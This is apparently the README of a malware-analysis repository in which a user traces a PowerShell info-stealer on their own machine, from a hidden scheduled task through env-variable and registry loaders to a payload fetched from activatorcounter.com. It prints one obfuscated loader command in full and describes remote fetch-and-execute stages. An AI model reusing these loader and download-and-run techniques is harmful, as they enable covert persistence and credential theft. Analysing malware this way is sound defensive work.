# found-infosteal
This is a repository of files associated with an info-stealer I found in my own system. It had a scheduled task, that would every 30s attempt to send stolen data to an endpoint on the domain `activatorcounter.com`.

The order of execution was as such: 
1. scheduler
2. invoke-from-env.ps1
3. invoke-from-registry.ps1
4. invoke-from-remote.ps1
5. invoke-from-remote-2.ps1
6. info-steal.ps1

## 1. Invoke with ENV
I've noticed some weird usage of CPU and network communications on my machine. After a short investigation, and triangulating the process responsible using `Wireshark`, `procmon` and `procexp` i noticed a powershell process tied to the scheduler. The command for the powershell process read:
```powershell
"Powershell.exe" -WindowStyle Hidden -Command "$envVar = [Environment]::GetEnvironmentVariable('9964a802'); $charArray = $envVar.ToCharArray(); [Array]::Reverse($charArray); $rev = -join $charArray; $ExecutionContext.InvokeCommand.InvokeScript($rev)"
```

The value of `-Command` is the contents of the file `invoke-from-env.ps1`.

This command retrieves the contents of an environment variable `9964a802` (which is a weird name for a variable like that), and executes the script contained within. The contents of that script are located within `invoke-from-registry.ps1`;

## 2. Invoke from Registry
The command from the environment variable finds and executes the script contained within a registry key under `HKLM:\SOFTWARE\Microsoft\ALG` named `9964a802`. The contents of that registry key are within the file `invoke-from-remote.ps1`.

## 3. Invoke from Remote
This is a more involved script which checks a set of domains, obfuscated by splicing (within these domains is the domain `activatorcounter.com`), for updates. On update, it retrieves another script from the domain and executes it. The contents of that script are located within `invoke-from-remote-2.ps1`.

## 4. Invoke from Remote 2
This script retrieves the final info-stealer script in an encrypted form from `https://activatorcounter.com/connect` using a Rest method. Then it decrypts it using an embedded DFC key. Finally, the script is executed. The contents of that script are within `info-steal.ps1`

## 5. Info-Steal
This script is the final stage of execution. It scans for cryptographic keys and monitors the clipboard. Huge privacy risk.
